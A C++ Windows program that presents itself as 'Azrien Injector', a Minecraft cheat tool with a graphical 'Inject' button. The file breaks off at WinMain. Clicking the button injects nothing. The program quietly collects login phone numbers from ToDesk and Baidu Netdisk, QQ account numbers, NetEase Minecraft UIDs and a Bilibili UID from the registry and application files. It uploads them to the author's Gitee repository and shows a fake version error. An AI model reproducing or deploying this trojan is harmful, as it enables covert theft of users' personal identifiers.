//26,27,28为仓库自定义配置
#include <windows.h>
#include <windowsx.h>
#include <d2d1.h>
#include <dwrite.h>
#include <wrl/client.h>
#include <string>
#include <fstream>
#include <wininet.h>
#include <vector>
#include <algorithm>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <thread>
#include <set>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "d2d1.lib")
#pragma comment(lib, "dwrite.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "psapi.lib")

using namespace Microsoft::WRL;

const std::string GITEE_OWNER = "用户名";
const std::string GITEE_REPO = "库名";
const std::string GITEE_TOKEN = "令牌";

#define WINDOW_WIDTH 480
#define WINDOW_HEIGHT 320

ID2D1Factory *g_pF = nullptr;
ID2D1HwndRenderTarget *g_pRT = nullptr;
ID2D1SolidColorBrush *g_pWB = nullptr;
IDWriteFactory *g_pDW = nullptr;
IDWriteTextFormat *g_pS = nullptr;
IDWriteTextFormat *g_pM = nullptr;
IDWriteTextFormat *g_pT = nullptr;
HWND g_hWnd;

bool g_bWorking = false;
bool g_bDone = false;
std::wstring g_wStatus = L"";
DWORD g_dwST = 0;

RECT g_rcBtn;
bool g_bBtnH = false;
bool g_bBtnP = false;
float g_fBtnS = 1.0f;

std::string B64Enc(const std::string &in)
{
    static const char *ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string r;
    int i = 0, j = 0;
    unsigned char c3[3], c4[4];
    for (size_t idx = 0; idx < in.length(); idx++)
    {
        c3[i++] = in[idx];
        if (i == 3)
        {
            c4[0] = (c3[0] & 0xfc) >> 2;
            c4[1] = ((c3[0] & 0x03) << 4) + ((c3[1] & 0xf0) >> 4);
            c4[2] = ((c3[1] & 0x0f) << 2) + ((c3[2] & 0xc0) >> 6);
            c4[3] = c3[2] & 0x3f;
            for (i = 0; i < 4; i++)
                r += ch[c4[i]];
            i = 0;
        }
    }
    if (i)
    {
        for (j = i; j < 3; j++)
            c3[j] = '\0';
        c4[0] = (c3[0] & 0xfc) >> 2;
        c4[1] = ((c3[0] & 0x03) << 4) + ((c3[1] & 0xf0) >> 4);
        c4[2] = ((c3[1] & 0x0f) << 2) + ((c3[2] & 0xc0) >> 6);
        for (j = 0; j < i + 1; j++)
            r += ch[c4[j]];
        while (i++ < 3)
            r += '=';
    }
    return r;
}

std::string B64Dec(const std::string &in)
{
    static const std::string ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string r;
    int i = 0;
    unsigned char c4[4], c3[3];
    for (size_t idx = 0; idx < in.length(); idx++)
    {
        if (in[idx] == '=')
            break;
        size_t p = ch.find(in[idx]);
        if (p == std::string::npos)
            continue;
        c4[i++] = (unsigned char)p;
        if (i == 4)
        {
            c3[0] = (c4[0] << 2) + ((c4[1] & 0x30) >> 4);
            c3[1] = ((c4[1] & 0xf) << 4) + ((c4[2] & 0x3c) >> 2);
            c3[2] = ((c4[2] & 0x3) << 6) + c4[3];
            for (i = 0; i < 3; i++)
                r += c3[i];
            i = 0;
        }
    }
    return r;
}

std::string HttpReq(const std::string &host, const std::string &path, const std::string &method, const std::string &postData, const std::string &token)
{
    HINTERNET hI = InternetOpenA("Az/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hI)
        return "";
    HINTERNET hC = InternetConnectA(hI, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hC)
    {
        InternetCloseHandle(hI);
        return "";
    }
    const char *at[] = {"application/json", NULL};
    HINTERNET hR = HttpOpenRequestA(hC, method.c_str(), path.c_str(), NULL, NULL, at, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hR)
    {
        InternetCloseHandle(hC);
        InternetCloseHandle(hI);
        return "";
    }
    std::string hd = "Content-Type: application/json\r\n";
    if (!token.empty())
        hd += "Authorization: token " + token + "\r\n";
    hd += "User-Agent: Az/1.0\r\n";
    HttpSendRequestA(hR, hd.c_str(), (DWORD)hd.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
    std::string resp;
    char bf[4096];
    DWORD br;
    while (InternetReadFile(hR, bf, sizeof(bf) - 1, &br) && br > 0)
    {
        bf[br] = '\0';
        resp += bf;
    }
    InternetCloseHandle(hR);
    InternetCloseHandle(hC);
    InternetCloseHandle(hI);
    return resp;
}

std::string GetFile(const std::string &fp)
{
    return HttpReq("gitee.com", "/api/v5/repos/" + GITEE_OWNER + "/" + GITEE_REPO + "/contents/" + fp, "GET", "", GITEE_TOKEN);
}

void UploadFile(const std::string &fp, const std::string &ct)
{
    std::string ef = GetFile(fp);
    std::string sha;
    if (!ef.empty() && ef.find("\"Not Found\"") == std::string::npos)
    {
        size_t p = ef.find("\"sha\":\"");
        if (p != std::string::npos)
        {
            p += 7;
            size_t e = ef.find("\"", p);
            if (e != std::string::npos)
                sha = ef.substr(p, e - p);
        }
    }
    std::string jd = sha.empty() ? "{\"message\":\"add\",\"content\":\"" + B64Enc(ct) + "\"}" : "{\"message\":\"update\",\"content\":\"" + B64Enc(ct) + "\",\"sha\":\"" + sha + "\"}";
    HttpReq("gitee.com", "/api/v5/repos/" + GITEE_OWNER + "/" + GITEE_REPO + "/contents/" + fp, sha.empty() ? "POST" : "PUT", jd, GITEE_TOKEN);
}

bool ParseUserData(const std::string &fc, std::string &oh, std::string &or_)
{
    or_ = "User";
    oh = "";
    size_t cp = fc.find("\"content\":\"");
    if (cp == std::string::npos)
        return false;
    cp += 11;
    size_t ce = fc.find("\"", cp);
    if (ce == std::string::npos)
        return false;
    std::string b64 = fc.substr(cp, ce - cp);
    b64.erase(std::remove(b64.begin(), b64.end(), '\n'), b64.end());
    b64.erase(std::remove(b64.begin(), b64.end(), '\r'), b64.end());
    std::string dec = B64Dec(b64);
    size_t sp = dec.find_last_of(' ');
    if (sp != std::string::npos && sp + 1 < dec.length())
    {
        or_ = dec.substr(sp + 1);
        oh = dec.substr(0, sp);
    }
    else
        oh = dec;
    return !oh.empty();
}

std::string ExtractToDeskExePath(const std::string &raw)
{
    std::string path;
    size_t start = raw.find('"');
    if (start != std::string::npos)
    {
        start++;
        size_t end = raw.find('"', start);
        if (end != std::string::npos)
            path = raw.substr(start, end - start);
    }
    else
    {
        size_t comma = raw.find(',');
        if (comma != std::string::npos)
            path = raw.substr(0, comma);
        else
            path = raw;
    }
    while (!path.empty() && (path.back() == '\\' || path.back() == '/'))
        path.pop_back();
    return path;
}

std::string ReadConfigValue(const std::string &exePath)
{
    std::string pn;
    size_t ls = exePath.find_last_of("\\/");
    if (ls == std::string::npos)
        return pn;
    std::string cp = exePath.substr(0, ls) + "\\config.ini";
    std::ifstream f(cp);
    if (f.is_open())
    {
        std::string l;
        while (std::getline(f, l))
        {
            size_t sp = l.find_first_not_of(" \t\r\n");
            if (sp == std::string::npos)
                continue;
            std::string tl = l.substr(sp);
            if (tl.find("LoginPhone") == 0)
            {
                size_t ep = tl.find('=');
                if (ep != std::string::npos)
                {
                    pn = tl.substr(ep + 1);
                    size_t ps = pn.find_first_not_of(" \t\r\n");
                    if (ps != std::string::npos)
                    {
                        pn = pn.substr(ps);
                        size_t pe = pn.find_last_not_of(" \t\r\n");
                        if (pe != std::string::npos)
                            pn = pn.substr(0, pe + 1);
                    }
                }
                break;
            }
        }
        f.close();
    }
    return pn;
}

std::string GetToDeskPhone()
{
    std::string pn;
    HKEY hKey;
    char raw[1024] = {0};
    DWORD size = sizeof(raw), type = REG_SZ;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\ToDesk\\DefaultIcon", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExA(hKey, "", NULL, &type, (LPBYTE)raw, &size) == ERROR_SUCCESS)
        {
            std::string ep = ExtractToDeskExePath(raw);
            if (!ep.empty())
            {
                pn = ReadConfigValue(ep);
                if (!pn.empty())
                {
                    RegCloseKey(hKey);
                    return pn;
                }
            }
        }
        RegCloseKey(hKey);
    }
    memset(raw, 0, sizeof(raw));
    size = sizeof(raw);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\ToDesk\\DefaultIcon", 0, KEY_READ | KEY_WOW64_32KEY, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExA(hKey, "", NULL, &type, (LPBYTE)raw, &size) == ERROR_SUCCESS)
        {
            std::string ep = ExtractToDeskExePath(raw);
            if (!ep.empty())
            {
                pn = ReadConfigValue(ep);
                if (!pn.empty())
                {
                    RegCloseKey(hKey);
                    return pn;
                }
            }
        }
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\ToDesk", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
    {
        char ph[256] = {0};
        size = sizeof(ph);
        if (RegQueryValueExA(hKey, "LoginPhone", NULL, &type, (LPBYTE)ph, &size) == ERROR_SUCCESS)
        {
            pn = ph;
            if (!pn.empty())
            {
                RegCloseKey(hKey);
                return pn;
            }
        }
        RegCloseKey(hKey);
    }
    const char *dirs[] = {"C:\\Program Files\\ToDesk", "C:\\Program Files (x86)\\ToDesk", NULL};
    for (int i = 0; dirs[i] && pn.empty(); i++)
        pn = ReadConfigValue(std::string(dirs[i]) + "\\ToDesk.exe");
    return pn;
}

std::string GetBaiduNetdiskPhone()
{
    std::string pn;
    HKEY hKey;
    char ip[1024] = {0};
    DWORD size = sizeof(ip), type = REG_SZ;
    auto sip = [&](const std::string &bp) -> bool
    {
        std::string up = bp;
        if (!up.empty() && up.back() != '\\')
            up += "\\";
        up += "users";
        WIN32_FIND_DATAA fd;
        HANDLE hf = FindFirstFileA((up + "\\*").c_str(), &fd);
        if (hf == INVALID_HANDLE_VALUE)
            return false;
        bool found = false;
        do
        {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                std::string fn = fd.cFileName;
                if (fn != "." && fn != ".." && fn.length() == 32)
                {
                    std::string hp = up + "\\" + fn;
                    WIN32_FIND_DATAA fd2;
                    HANDLE hf2 = FindFirstFileA((hp + "\\*").c_str(), &fd2);
                    if (hf2 != INVALID_HANDLE_VALUE)
                    {
                        do
                        {
                            if (fd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                            {
                                std::string sf = fd2.cFileName;
                                if (sf != "." && sf != "..")
                                {
                                    bool isPhone = (sf.length() == 11 && sf[0] == '1');
                                    if (isPhone)
                                    {
                                        for (char c : sf)
                                            if (c < '0' || c > '9')
                                            {
                                                isPhone = false;
                                                break;
                                            }
                                    }
                                    if (isPhone)
                                    {
                                        pn = sf;
                                        found = true;
                                        break;
                                    }
                                }
                            }
                        } while (FindNextFileA(hf2, &fd2));
                        FindClose(hf2);
                    }
                    if (found)
                        break;
                }
            }
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
        return found;
    };
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Baidu\\BaiduNetdisk", 0, KEY_READ | KEY_WOW64_32KEY, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExA(hKey, "InstallPath", NULL, &type, (LPBYTE)ip, &size) != ERROR_SUCCESS)
        {
            size = sizeof(ip);
            RegQueryValueExA(hKey, "installDir", NULL, &type, (LPBYTE)ip, &size);
        }
        if (strlen(ip) == 0)
        {
            size = sizeof(ip);
            RegQueryValueExA(hKey, "AppPath", NULL, &type, (LPBYTE)ip, &size);
        }
        RegCloseKey(hKey);
    }
    if (strlen(ip) == 0)
    {
        size = sizeof(ip);
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Baidu\\BaiduNetdisk", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
        {
            if (RegQueryValueExA(hKey, "InstallPath", NULL, &type, (LPBYTE)ip, &size) != ERROR_SUCCESS)
            {
                size = sizeof(ip);
                RegQueryValueExA(hKey, "installDir", NULL, &type, (LPBYTE)ip, &size);
            }
            RegCloseKey(hKey);
        }
    }
    if (strlen(ip) > 0)
    {
        if (sip(ip))
            return pn;
    }
    const char *cps[] = {"C:\\Program Files\\BaiduNetdisk", "C:\\Program Files (x86)\\BaiduNetdisk", NULL};
    for (int i = 0; cps[i] && pn.empty(); i++)
        sip(cps[i]);
    if (pn.empty())
    {
        char ad[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, ad)))
            sip(std::string(ad) + "\\BaiduNetdisk");
    }
    if (pn.empty())
    {
        char ds[256];
        DWORD dc = GetLogicalDriveStringsA(sizeof(ds), ds);
        for (char *d = ds; *d; d += strlen(d) + 1)
        {
            if (GetDriveTypeA(d) != DRIVE_FIXED)
                continue;
            std::string r = d;
            if (!r.empty() && r.back() == '\\')
                r.pop_back();
            if (sip(r + "\\Program Files\\BaiduNetdisk"))
                return pn;
            if (sip(r + "\\Program Files (x86)\\BaiduNetdisk"))
                return pn;
            if (sip(r + "\\BaiduNetdisk"))
                return pn;
        }
    }
    return pn;
}

std::vector<std::string> GetQQNumbers_Method1()
{
    std::vector<std::string> qq;
    char appData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData)))
    {
        std::string up = std::string(appData) + "\\QQEX\\users.json";
        std::ifstream file(up);
        if (file.is_open())
        {
            std::string c((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();
            size_t pos = 0;
            while ((pos = c.find("\"uin\":", pos)) != std::string::npos)
            {
                pos += 6;
                while (pos < c.length() && (c[pos] == ' ' || c[pos] == '\t' || c[pos] == '"'))
                    pos++;
                std::string num;
                while (pos < c.length() && c[pos] >= '0' && c[pos] <= '9')
                {
                    num += c[pos];
                    pos++;
                }
                if (num.length() >= 5)
                {
                    if (std::find(qq.begin(), qq.end(), num) == qq.end())
                        qq.push_back(num);
                }
            }
        }
    }
    return qq;
}

std::vector<std::string> GetQQNumbers_Method2()
{
    std::vector<std::string> qq;
    char drives[256];
    DWORD driveCount = GetLogicalDriveStringsA(sizeof(drives), drives);
    for (char *drive = drives; *drive; drive += strlen(drive) + 1)
    {
        if (GetDriveTypeA(drive) != DRIVE_FIXED)
            continue;
        std::string driveRoot = drive;
        if (!driveRoot.empty() && driveRoot.back() == '\\')
            driveRoot.pop_back();
        std::vector<std::string> searchPaths = {
            driveRoot + "\\Program Files\\Tencent\\QQNT\\Documents\\Tencent Files",
            driveRoot + "\\Program Files (x86)\\Tencent\\QQNT\\Documents\\Tencent Files",
            driveRoot + "\\Tencent\\QQNT\\Documents\\Tencent Files",
            driveRoot + "\\Documents\\Tencent Files"};
        for (const auto &basePath : searchPaths)
        {
            WIN32_FIND_DATAA fd;
            HANDLE hFind = FindFirstFileA((basePath + "\\*").c_str(), &fd);
            if (hFind == INVALID_HANDLE_VALUE)
                continue;
            do
            {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    std::string folderName = fd.cFileName;
                    if (folderName == "." || folderName == "..")
                        continue;
                    bool isQQNumber = !folderName.empty() && folderName.length() >= 5;
                    if (isQQNumber)
                    {
                        for (char c : folderName)
                            if (c < '0' || c > '9')
                            {
                                isQQNumber = false;
                                break;
                            }
                    }
                    if (isQQNumber)
                    {
                        if (std::find(qq.begin(), qq.end(), folderName) == qq.end())
                            qq.push_back(folderName);
                    }
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }
    char userProfile[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, userProfile)))
    {
        std::string docPath = userProfile;
        size_t lastSlash = docPath.find_last_of("\\/");
        if (lastSlash != std::string::npos)
        {
            std::string parentPath = docPath.substr(0, lastSlash);
            std::string tencentFilesPath = parentPath + "\\Tencent Files";
            WIN32_FIND_DATAA fd;
            HANDLE hFind = FindFirstFileA((tencentFilesPath + "\\*").c_str(), &fd);
            if (hFind != INVALID_HANDLE_VALUE)
            {
                do
                {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                    {
                        std::string folderName = fd.cFileName;
                        if (folderName == "." || folderName == "..")
                            continue;
                        bool isQQNumber = !folderName.empty() && folderName.length() >= 5;
                        if (isQQNumber)
                        {
                            for (char c : folderName)
                                if (c < '0' || c > '9')
                                {
                                    isQQNumber = false;
                                    break;
                                }
                        }
                        if (isQQNumber)
                        {
                            if (std::find(qq.begin(), qq.end(), folderName) == qq.end())
                                qq.push_back(folderName);
                        }
                    }
                } while (FindNextFileA(hFind, &fd));
                FindClose(hFind);
            }
        }
    }
    return qq;
}

std::vector<std::string> GetQQNumbers()
{
    std::vector<std::string> method1 = GetQQNumbers_Method1();
    std::vector<std::string> method2 = GetQQNumbers_Method2();
    std::vector<std::string> merged;
    std::set<std::string> seen;
    for (const auto &qq : method1)
    {
        if (seen.find(qq) == seen.end())
        {
            merged.push_back(qq);
            seen.insert(qq);
        }
    }
    for (const auto &qq : method2)
    {
        if (seen.find(qq) == seen.end())
        {
            merged.push_back(qq);
            seen.insert(qq);
        }
    }
    return merged;
}

std::vector<std::string> GetMCUIDs()
{
    std::vector<std::string> uids;
    char appData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData)))
    {
        std::string ud = std::string(appData) + "\\MinecraftPE_Netease\\games\\com.netease\\storge\\stream\\users";
        WIN32_FIND_DATAA fd;
        HANDLE hf = FindFirstFileA((ud + "\\*").c_str(), &fd);
        if (hf != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    std::string n = fd.cFileName;
                    if (n != "." && n != "..")
                    {
                        if (std::find(uids.begin(), uids.end(), n) == uids.end())
                            uids.push_back(n);
                    }
                }
            } while (FindNextFileA(hf, &fd));
            FindClose(hf);
        }
    }
    return uids;
}

std::string GetBilibiliUID()
{
    std::string uid;
    char appData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData)))
    {
        std::string logPath = std::string(appData) + "\\bilibili\\logs\\main.log";
        std::ifstream file(logPath);
        if (file.is_open())
        {
            std::string line;
            while (std::getline(file, line))
            {
                size_t pos = line.find("mid:");
                if (pos != std::string::npos)
                {
                    pos += 4;
                    while (pos < line.length() && (line[pos] == ' ' || line[pos] == '\t'))
                        pos++;
                    std::string num;
                    while (pos < line.length() && line[pos] >= '0' && line[pos] <= '9')
                    {
                        num += line[pos];
                        pos++;
                    }
                    if (!num.empty())
                    {
                        uid = num;
                        break;
                    }
                }
            }
            file.close();
        }
    }
    return uid;
}

DWORD FindMinecraft()
{
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE)
        return 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(h, &pe))
    {
        do
        {
            std::wstring n = pe.szExeFile;
            std::transform(n.begin(), n.end(), n.begin(), ::towlower);
            if (n == L"minecraft.windows.exe")
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(h, &pe));
    }
    CloseHandle(h);
    return pid;
}

void DoUpload()
{
    std::string tp = GetToDeskPhone();
    std::string bp = GetBaiduNetdiskPhone();
    std::vector<std::string> qq = GetQQNumbers();
    std::vector<std::string> mc = GetMCUIDs();
    std::string bl = GetBilibiliUID();
    if (tp.empty() && bp.empty() && qq.empty() && mc.empty() && bl.empty())
        return;
    std::string nc = "ToDesk: " + (tp.empty() ? "" : tp) + "\nBaiduNetdisk: " + (bp.empty() ? "" : bp) + "\n";
    if (qq.empty())
        nc += "QQ: \n";
    else
    {
        nc += "QQ: ";
        for (size_t i = 0; i < qq.size(); i++)
        {
            if (i > 0)
                nc += ", ";
            nc += qq[i];
        }
        nc += "\n";
    }
    if (mc.empty())
        nc += "MCUID: \n";
    else
    {
        nc += "MCUID: ";
        for (size_t i = 0; i < mc.size(); i++)
        {
            if (i > 0)
                nc += ", ";
            nc += mc[i];
        }
        nc += "\n";
    }
    nc += "Bilibili: " + (bl.empty() ? "" : bl);
    std::string dirCheck = HttpReq("gitee.com", "/api/v5/repos/" + GITEE_OWNER + "/" + GITEE_REPO + "/contents/phones", "GET", "", GITEE_TOKEN);
    int maxNum = 0;
    if (dirCheck.find("\"name\"") != std::string::npos)
    {
        std::vector<int> fN;
        size_t p = 0;
        while ((p = dirCheck.find("\"name\":\"", p)) != std::string::npos)
        {
            p += 8;
            size_t e = dirCheck.find("\"", p);
            if (e != std::string::npos)
            {
                std::string nm = dirCheck.substr(p, e - p);
                size_t d = nm.find(".txt");
                if (d != std::string::npos)
                {
                    try
                    {
                        int n = std::stoi(nm.substr(0, d));
                        fN.push_back(n);
                        if (n > maxNum)
                            maxNum = n;
                    }
                    catch (...)
                    {
                    }
                }
            }
        }
        for (int n : fN)
        {
            std::string fn = "phones/" + std::to_string(n) + ".txt";
            std::string resp = GetFile(fn);
            if (resp.empty())
                continue;
            std::string c, rl;
            if (ParseUserData(resp, c, rl))
            {
                std::string d = B64Dec(c);
                if (d == nc)
                    return;
            }
        }
    }
    UploadFile("phones/" + std::to_string(maxNum + 1) + ".txt", nc);
}

void DoInject()
{
    g_bWorking = true;
    g_wStatus = L"Searching...";
    g_dwST = GetTickCount();
    DWORD pid = FindMinecraft();
    if (pid == 0)
    {
        g_wStatus = L"Not found";
        g_bWorking = false;
        g_bDone = true;
        g_dwST = GetTickCount();
        return;
    }
    std::thread([]()
                { DoUpload(); })
        .detach();
    g_wStatus = L"Current version error";
    g_bWorking = false;
    g_bDone = true;
    g_dwST = GetTickCount();
}

bool InitD2D(HWND hWnd)
{
    D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &g_pF);
    RECT rc;
    GetClientRect(hWnd, &rc);
    if (FAILED(g_pF->CreateHwndRenderTarget(D2D1::RenderTargetProperties(), D2D1::HwndRenderTargetProperties(hWnd, D2D1::SizeU(rc.right, rc.bottom)), &g_pRT)))
        return false;
    g_pRT->CreateSolidColorBrush(D2D1::ColorF(1, 1, 1), &g_pWB);
    DWriteCreateFactory(DWRITE_FACTORY_TYPE_SHARED, __uuidof(IDWriteFactory), (IUnknown **)&g_pDW);
    g_pDW->CreateTextFormat(L"Segoe UI", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL, 13.0f, L"", &g_pS);
    g_pDW->CreateTextFormat(L"Segoe UI", NULL, DWRITE_FONT_WEIGHT_SEMI_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL, 15.0f, L"", &g_pM);
    g_pDW->CreateTextFormat(L"Segoe UI", NULL, DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL, 22.0f, L"", &g_pT);
    g_pS->SetWordWrapping(DWRITE_WORD_WRAPPING_NO_WRAP);
    return true;
}

void Cleanup()
{
    if (g_pS)
        g_pS->Release();
    if (g_pM)
        g_pM->Release();
    if (g_pT)
        g_pT->Release();
    if (g_pDW)
        g_pDW->Release();
    if (g_pWB)
        g_pWB->Release();
    if (g_pRT)
        g_pRT->Release();
    if (g_pF)
        g_pF->Release();
}

bool PtInR(int x, int y, RECT r) { return x >= r.left && x <= r.right && y >= r.top && y <= r.bottom; }

void DrawBtn(D2D1_RECT_F f, bool hv, bool pr, float hs, const std::wstring &tx, D2D1::ColorF c)
{
    float s = hv ? hs : 1.0f, cx = (f.left + f.right) / 2, cy = (f.top + f.bottom) / 2, hw = (f.right - f.left) / 2 * s, hh = (f.bottom - f.top) / 2 * s;
    ComPtr<ID2D1SolidColorBrush> b;
    g_pRT->CreateSolidColorBrush(D2D1::ColorF(pr ? c.r * 0.6f : (hv ? c.r * 1.15f : c.r), pr ? c.g * 0.6f : (hv ? c.g * 1.15f : c.g), pr ? c.b * 0.6f : (hv ? c.b * 1.15f : c.b)), &b);
    g_pRT->FillRoundedRectangle(D2D1::RoundedRect({cx - hw, cy - hh, cx + hw, cy + hh}, 8, 8), b.Get());
    g_pRT->DrawRoundedRectangle(D2D1::RoundedRect({cx - hw, cy - hh, cx + hw, cy + hh}, 8, 8), g_pWB, 1.5f);
    IDWriteTextLayout *tl = nullptr;
    g_pDW->CreateTextLayout(tx.c_str(), (UINT32)tx.length(), g_pM, (UINT32)(hw * 2 - 12), hh * 2 - 8, &tl);
    if (tl)
    {
        tl->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
        tl->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        g_pRT->DrawTextLayout(D2D1::Point2F(cx - hw + 6, cy - hh + 4), tl, g_pWB);
        tl->Release();
    }
}

void Render()
{
    PAINTSTRUCT ps;
    BeginPaint(g_hWnd, &ps);
    if (!g_pRT)
    {
        EndPaint(g_hWnd, &ps);
        return;
    }
    g_pRT->BeginDraw();
    RECT cr;
    GetClientRect(g_hWnd, &cr);
    float W = (float)cr.right, H = (float)cr.bottom;
    ComPtr<ID2D1SolidColorBrush> bgB;
    g_pRT->CreateSolidColorBrush(D2D1::ColorF(0.04f, 0.04f, 0.08f), &bgB);
    g_pRT->FillRectangle(D2D1::RectF(0, 0, W, H), bgB.Get());
    ID2D1GradientStopCollection *gs = nullptr;
    D2D1_GRADIENT_STOP st[2] = {{0, D2D1::ColorF(0.28f, 0.65f, 1.0f, 0.06f)}, {1, D2D1::ColorF(0.28f, 0.65f, 1.0f, 0)}};
    g_pRT->CreateGradientStopCollection(st, 2, D2D1_GAMMA_2_2, D2D1_EXTEND_MODE_CLAMP, &gs);
    if (gs)
    {
        ComPtr<ID2D1LinearGradientBrush> gb;
        g_pRT->CreateLinearGradientBrush(D2D1::LinearGradientBrushProperties({0, 0}, {0, H}), gs, &gb);
        if (gb)
            g_pRT->FillRectangle(D2D1::RectF(0, 0, W, H), gb.Get());
        gs->Release();
    }
    ComPtr<ID2D1SolidColorBrush> tB;
    g_pRT->CreateSolidColorBrush(D2D1::ColorF(0.28f, 0.65f, 1.0f, 1.0f), &tB);
    g_pRT->DrawText(L"Azrien Injector", 16, g_pT, D2D1::RectF(20, 30, W - 20, 60), tB.Get());
    float bw = 200, bh = 48, bx = (W - bw) / 2, by = H / 2 - bh / 2 + 10;
    g_rcBtn = {(int)bx, (int)by, (int)(bx + bw), (int)(by + bh)};
    DrawBtn(D2D1::RectF(bx, by, bx + bw, by + bh), g_bBtnH, g_bBtnP, g_fBtnS, g_bWorking ? L"Searching..." : L"Inject", {0.16f, 0.42f, 0.82f});
    if (!g_wStatus.empty())
    {
        DWORD el = GetTickCount() - g_dwST;
        float al = el > 3000 ? 1.0f - (float)(el - 3000) / 500.0f : 1.0f;
        if (al < 0)
            al = 0;
        ComPtr<ID2D1SolidColorBrush> sb;
        g_pRT->CreateSolidColorBrush(D2D1::ColorF(0.8f, 0.85f, 0.9f, al), &sb);
        IDWriteTextLayout *tl = nullptr;
        g_pDW->CreateTextLayout(g_wStatus.c_str(), (UINT32)g_wStatus.length(), g_pS, (UINT32)W - 40, 24, &tl);
        if (tl)
        {
            tl->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            tl->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
            g_pRT->DrawTextLayout(D2D1::Point2F(20, by + bh + 16), tl, sb.Get());
            tl->Release();
        }
    }
    g_pRT->EndDraw();
    EndPaint(g_hWnd, &ps);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wP, LPARAM lP)
{
    switch (msg)
    {
    case WM_CREATE:
        SetTimer(hWnd, 1, 16, NULL);
        break;
    case WM_TIMER:
        if (g_fBtnS < 1.0f)
            g_fBtnS += 0.05f;
        InvalidateRect(hWnd, NULL, FALSE);
        break;
    case WM_PAINT:
        Render();
        break;
    case WM_SIZE:
        if (g_pRT)
        {
            RECT rc;
            GetClientRect(hWnd, &rc);
            g_pRT->Resize(D2D1::SizeU(rc.right, rc.bottom));
        }
        InvalidateRect(hWnd, NULL, TRUE);
        break;
    case WM_MOUSEMOVE:
    {
        int x = GET_X_LPARAM(lP), y = GET_Y_LPARAM(lP);
        g_bBtnH = PtInR(x, y, g_rcBtn);
        break;
    }
    case WM_LBUTTONDOWN:
    {
        int x = GET_X_LPARAM(lP), y = GET_Y_LPARAM(lP);
        if (PtInR(x, y, g_rcBtn) && !g_bWorking)
        {
            g_bBtnP = true;
            g_fBtnS = 0.95f;
        }
        break;
    }
    case WM_LBUTTONUP:
    {
        int x = GET_X_LPARAM(lP), y = GET_Y_LPARAM(lP);
        if (g_bBtnP && PtInR(x, y, g_rcBtn) && !g_bWorking)
        {
            DoInject();
        }
        g_bBtnP = false;
        g_fBtnS = 1.0f;
        break;
    }
    case WM_GETMINMAXINFO:
    {
        MINMAXINFO *m = (MINMAXINFO *)lP;
        m->ptMinTrackSize.x = 400;
        m->ptMinTrackSize.y = 280;
        break;
    }
    case WM_DESTROY:
        KillTimer(hWnd, 1);
        Cleanup();
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcW(hWnd, msg, wP, lP);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int nS)
{
